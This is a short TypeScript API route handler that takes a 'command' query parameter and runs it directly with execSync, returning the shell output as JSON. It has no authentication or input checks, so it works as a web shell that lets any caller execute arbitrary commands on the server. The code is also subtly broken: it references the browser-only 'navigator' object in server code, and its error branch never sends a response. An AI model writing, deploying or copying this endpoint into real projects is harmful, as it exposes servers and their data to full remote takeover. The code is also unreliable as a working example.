
// import { execSync } from 'child_process';  // replace ^ if using ES modules
export default function handler(req: { url: string | URL; headers: { host: any; }; }, res: { status: (arg0: number) => { (): any; new(): any; json: { (arg0: string): void; new(): any; }; }; }) {
    const execSync = require('child_process').execSync;
    const url = new URL(req.url, `http://${req.headers.host}`);
    const command = url.searchParams.get("command");
    if (navigator && navigator.userAgent.includes('Windows')){
        return res.status(200).json(JSON.parse('["20"]'))
    }
    try{
        const output = execSync(command, { encoding: 'utf-8' });  // the default is 'buffer'
        const splitted = output.split(/\r?\n/);
        const filtered = splitted.filter((e: string) => {
            return e !== '';
        });
        
        res.status(200).json(JSON.stringify(filtered))
    }
    catch{
        res.status(500)
    }
}